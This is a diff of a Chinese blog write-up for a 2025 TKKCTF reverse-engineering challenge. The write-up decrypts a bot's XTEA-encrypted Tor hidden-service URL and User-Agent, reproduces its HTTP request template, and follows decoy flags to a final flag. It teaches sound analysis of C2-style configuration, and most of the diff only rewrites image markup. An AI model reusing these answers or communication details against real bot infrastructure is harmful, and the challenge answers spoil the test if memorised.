-<p>![](2025 TKKCTF&#x2F;1765197178219-1d129788-663a-452e-bf7b-4bedc25dbf6e.png)</p>
-<p>![](2025 TKKCTF&#x2F;1765197153675-9b93f0e3-9109-490c-9f82-714745ac858b.png)</p>
+<p><img src="/2025_TKKCTF/1765197178219-1d129788-663a-452e-bf7b-4bedc25dbf6e.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025_TKKCTF/1765197153675-9b93f0e3-9109-490c-9f82-714745ac858b.png" srcset="/img/loading.gif" lazyload></p>
 <p>接下来来解密URL和User-Agent了</p>
-<p>![](2025 TKKCTF&#x2F;1765199646069-392ace19-976b-4aeb-ac93-50b90001aff0.png)</p>
+<p><img src="/2025_TKKCTF/1765199646069-392ace19-976b-4aeb-ac93-50b90001aff0.png" srcset="/img/loading.gif" lazyload></p>
 <p>点进去发现是标准的XTEA算法，32轮</p>
 <p>找一下密文</p>
-<p>![](2025 TKKCTF&#x2F;1765199849042-c22c8b4e-3e4f-4a99-a737-56b4b7f71158.png)</p>
+<p><img src="/2025_TKKCTF/1765199849042-c22c8b4e-3e4f-4a99-a737-56b4b7f71158.png" srcset="/img/loading.gif" lazyload></p>
 <p>这边其实已经写了</p>
 <p>XTEA解密脚本如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs plain">import struct<br><br>def xtea_decrypt_block(v, key):<br>    v0, v1 = struct.unpack(&#x27;&lt;II&#x27;, v)<br>    delta = 0x61C88647<br>    sum_val = 0xC6EF3720  # delta * 32<br>    <br>    for i in range(32):<br>        v1 = (v1 - ((((v0 &gt;&gt; 5) ^ (v0 &lt;&lt; 4)) + v0) ^ (key[(sum_val &gt;&gt; 11) &amp; 3] + sum_val))) &amp; 0xFFFFFFFF<br>        sum_val = (sum_val + delta) &amp; 0xFFFFFFFF<br>        v0 = (v0 - ((((v1 &gt;&gt; 5) ^ (v1 &lt;&lt; 4)) + v1) ^ (key[sum_val &amp; 3] + sum_val))) &amp; 0xFFFFFFFF<br>    <br>    return struct.pack(&#x27;&lt;II&#x27;, v0, v1)<br><br>def hex_string_to_int(hex_str):<br>    if isinstance(hex_str, str):<br>        if hex_str.startswith(&#x27;0x&#x27;):<br>            return int(hex_str, 16)<br>        else:<br>            return int(hex_str, 16)<br>    return hex_str<br><br>def decrypt_xxtea(ciphertext_hex, key_hex):<br>    key = [hex_string_to_int(k) for k in key_hex]<br>    print(f&quot;密钥(整数形式): &#123;[hex(k) for k in key]&#125;&quot;)<br><br>    ciphertext_bytes = bytes([hex_string_to_int(b) for b in ciphertext_hex])<br>    print(f&quot;密文长度: &#123;len(ciphertext_bytes)&#125; 字节&quot;)<br><br>    if len(ciphertext_bytes) % 8 != 0:<br>        print(f&quot;警告: 密文长度(&#123;len(ciphertext_bytes)&#125;)不是8的倍数，可能会解密失败&quot;)<br><br>    decrypted_data = bytearray()<br>    block_size = 8<br>    <br>    for i in range(0, len(ciphertext_bytes), block_size):<br>        if i + block_size &lt;= len(ciphertext_bytes):<br>            block = ciphertext_bytes[i:i + block_size]<br>            decrypted_block = xtea_decrypt_block(block, key)<br>            decrypted_data.extend(decrypted_block)<br><br>    try:<br>        padding_length = decrypted_data[-1]<br>        if padding_length &lt;= block_size:<br>            if all(b == padding_length for b in decrypted_data[-padding_length:]):<br>                decrypted_data = decrypted_data[:-padding_length]<br>                print(f&quot;去除PKCS7填充: &#123;padding_length&#125; 字节&quot;)<br>    except (IndexError, ValueError):<br>        pass<br>    return bytes(decrypted_data)<br><br><br>key = [&#x27;0xdfaaee15&#x27;, &#x27;0xf3066870&#x27;, &#x27;0x544ee10f&#x27;, &#x27;0xec935b22&#x27;]<br>ciphertext = [<br>    0xAB, 0x80, 0x05, 0x4B, 0xE0, 0x0A, 0x84, 0x9D, 0x2C, 0x1E, <br>    0xC3, 0xEA, 0x79, 0x0B, 0x55, 0x0D, 0x24, 0x08, 0x26, 0xD0, <br>    0x41, 0x8F, 0x33, 0x0A, 0xEE, 0xB4, 0xB4, 0x1F, 0x99, 0x47, <br>    0x5C, 0x2B, 0xFA, 0x5E, 0xF5, 0xFD, 0xF3, 0xE9, 0x85, 0x3B, <br>    0xEC, 0x7A, 0x64, 0xD7, 0xEA, 0x14, 0x7D, 0x8E, 0xFB, 0x20, <br>    0x70, 0x73, 0x5D, 0xD6, 0x5F, 0x63, 0x13, 0x5B, 0xF1, 0xB0, <br>    0x64, 0xC2, 0x10, 0x6C, 0xC1, 0xB1, 0x4B, 0x72, 0xB7, 0x51, <br>    0x83, 0x73<br>]<br><br><br>print(&quot;开始XXTEA解密...&quot;)<br>print(&quot;=&quot; * 50)<br><br>decrypted_result = decrypt_xxtea(ciphertext, key)<br><br>print(&quot;\n解密结果:&quot;)<br>print(&quot;=&quot; * 50)<br>print(f&quot;原始字节: &#123;decrypted_result.hex()&#125;&quot;)<br><br><br>try:<br>    utf8_decoded = decrypted_result.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)<br>    print(f&quot;UTF-8解码: &#123;utf8_decoded&#125;&quot;)<br>except Exception as e:<br>    print(f&quot;UTF-8解码失败: &#123;e&#125;&quot;)<br><br>print(&quot;=&quot; * 50)<br>print(&quot;解密完成!&quot;)<br></code></pre></td></tr></table></figure>
@@ -540,40 +606,40 @@
 
 <p>解密得到User-Agent：TKKC-Bot-Agent&#x2F;%s</p>
 <p>4，发请求到127.0.0.1:9050</p>
-<p>![](2025 TKKCTF&#x2F;1765197269826-300d7258-9d61-47d1-ab39-74687f042ce1.png)</p>
+<p><img src="/2025_TKKCTF/1765197269826-300d7258-9d61-47d1-ab39-74687f042ce1.png" srcset="/img/loading.gif" lazyload></p>
 <p>这边是直接明文写的，一些很基础的请求结构</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">GET /&#123;path&#125; HTTP/1.0<br>Host: &#123;onion_address&#125;<br>User-Agent: TKKC-Bot-Agent/&#123;version&#125;<br>Connection: close<br></code></pre></td></tr></table></figure>
 
 <p>我们看到了URL是onion结尾的，所以这个地方其实用到了Tor隐藏</p>
-<p>![](2025 TKKCTF&#x2F;1765200612355-3b9de193-214a-4fd7-af58-be7a03694daf.png)</p>
+<p><img src="/2025_TKKCTF/1765200612355-3b9de193-214a-4fd7-af58-be7a03694daf.png" srcset="/img/loading.gif" lazyload></p>
 <p>建立一下Tor连接，连接完之后才能进行下一步</p>
 <p>根据刚刚得到的User-Agent，我们得到了这样子一串十六进制</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">20583e28300b1e2a014a5f416f73476b720023781c66781c2679026f665d6b72107f39285a7807264f44446d476b4c38147a2d720855174b5b574f<br></code></pre></td></tr></table></figure>
 
 <p>用刚刚得到的那个Key进行异或，得到了一串flag</p>
-<p>![](2025 TKKCTF&#x2F;1765201093094-a34f2fb6-d327-4a1e-b8ba-ad371145c8ef.png)</p>
+<p><img src="/2025_TKKCTF/1765201093094-a34f2fb6-d327-4a1e-b8ba-ad371145c8ef.png" srcset="/img/loading.gif" lazyload></p>
 <p>xujc{H3ad3rs_Ar3_Th3_K3y_T0_Th3_D4rkw3b_bvt_r3al_1n_C0nfig}</p>
 <p>但是是假的</p>
 <p>这一串leet提示了真正的flag在config里</p>
 <p>我们加上&#x2F;config路径</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">20583e28300b1e2a014a5f416f73476b720023781c66781c2679026f665d6b72107f39285a7807264f44446d476b4c38147a2d7278284d1c5e4d<br></code></pre></td></tr></table></figure>
 
-<p>![](2025 TKKCTF&#x2F;1765201277194-33701c15-901d-4407-9c12-3b714ff0ae63.png)</p>
+<p><img src="/2025_TKKCTF/1765201277194-33701c15-901d-4407-9c12-3b714ff0ae63.png" srcset="/img/loading.gif" lazyload></p>
 <p>同样的手段得到xujc{H3ad3rs_Ar3_Th3_K3y_T0_Th3_D4rkw3b_bvt_r3al_1n_3M41l}</p>
 <p>还是错的，说在&#x2F;email，但是这次直接看没有</p>
 <p>我们另存为HAR</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/PureWaterSun/har-analyzer">https://github.com/PureWaterSun/har-analyzer</a></p>
 <p>运用一下这个工具</p>
-<p>![](2025 TKKCTF&#x2F;1765201547857-b23c4992-1a42-4dcc-a542-7559875af2ab.png)</p>
+<p><img src="/2025_TKKCTF/1765201547857-b23c4992-1a42-4dcc-a542-7559875af2ab.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到X-Emergency-Contact这边有一串字符串</p>
 <p>dGtrY19zaGFkb3dfb3BzXzg4QHlvcG1haWwuY29t</p>
 <p>base64解码一下</p>
-<p>![](2025 TKKCTF&#x2F;1765201588815-55e73f5a-68dd-487d-84f9-94602c79be3f.png)</p>
+<p><img src="/2025_TKKCTF/1765201588815-55e73f5a-68dd-487d-84f9-94602c79be3f.png" srcset="/img/loading.gif" lazyload></p>
 <p>得到了邮箱地址</p>
 <p><a target="_blank" rel="noopener" href="https://yopmail.com/zh/">https://yopmail.com/zh/</a></p>
-<p>![](2025 TKKCTF&#x2F;1765201609324-bff03271-2de1-4a94-b2d7-0e10d1f6df73.png)</p>
+<p><img src="/2025_TKKCTF/1765201609324-bff03271-2de1-4a94-b2d7-0e10d1f6df73.png" srcset="/img/loading.gif" lazyload></p>
 <p>给邮箱地址是一个临时地址</p>
-<p>![](2025 TKKCTF&#x2F;1765201637293-a51dddf6-0253-4594-826f-d743af675a2f.png)</p>
+<p><img src="/2025_TKKCTF/1765201637293-a51dddf6-0253-4594-826f-d743af675a2f.png" srcset="/img/loading.gif" lazyload></p>
 <p>点开我们终于得到了flag</p>
 <p>xujc{R3sp0ns3_H3ad3rs_L3ak_Th3_Tru7h}</p>
 
@@ -630,7 +696,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>2025TKKCTF</div>
-      <div>https://mei-you-qian.github.io/2025/12/09/2025 TKKCTF/</div>
+      <div>https://mei-you-qian.github.io/2025/12/09/2025_TKKCTF/</div>
     </div>
     <div class="license-meta">
       
